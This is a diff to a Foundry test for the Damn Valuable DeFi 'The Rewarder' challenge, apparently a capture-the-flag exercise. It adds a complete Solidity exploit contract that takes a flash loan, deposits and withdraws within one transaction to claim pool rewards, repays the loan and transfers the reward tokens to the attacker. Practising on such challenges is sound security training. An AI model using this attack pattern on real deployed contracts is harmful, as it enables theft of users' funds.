@@ -88,7 +88,9 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.warp(block.timestamp + 6 days);
+        Exploit e = new Exploit(address(dvt),address(theRewarderPool), address(flashLoanerPool), address(attacker));
+        e.startGame(1_000_000e18);
         /**
          * EXPLOIT END *
          */
@@ -116,5 +118,32 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+}
+
+contract Exploit {
+    address public dvt;
+    address public theRewarderPool;
+    address public lenderPool;
+    address public attacker;
+
+    constructor(address _dvt, address _theRewarderPool, address _flashLoanerPool, address _attacker) {
+        dvt = _dvt;
+        theRewarderPool = _theRewarderPool;
+        lenderPool = _flashLoanerPool;
+        attacker = _attacker;
+    }
+    function receiveFlashLoan(uint256 _amount) public {
+        //dvt.call(abi.encodeWithSelector(DamnValuableToken.increaseAllowance.selector, address(theRewarderPool), _amount));
+        dvt.call(abi.encodeWithSignature("approve(address,uint256)",theRewarderPool,_amount));
+        theRewarderPool.call(abi.encodeWithSelector(TheRewarderPool.deposit.selector,_amount));
+        theRewarderPool.call(abi.encodeWithSelector(TheRewarderPool.withdraw.selector, _amount));
+        dvt.call(abi.encodeWithSignature("transfer(address,uint256)", lenderPool, _amount));
+        uint256 loot = TheRewarderPool(theRewarderPool).rewardToken().balanceOf(address(this));
+        TheRewarderPool(theRewarderPool).rewardToken().transfer(attacker,loot);
+    }
+    function startGame(uint256 _amount) public {
+        (bool success,) = lenderPool.call(abi.encodeWithSelector(FlashLoanerPool.flashLoan.selector, _amount));
+        require(success);
     }
 }
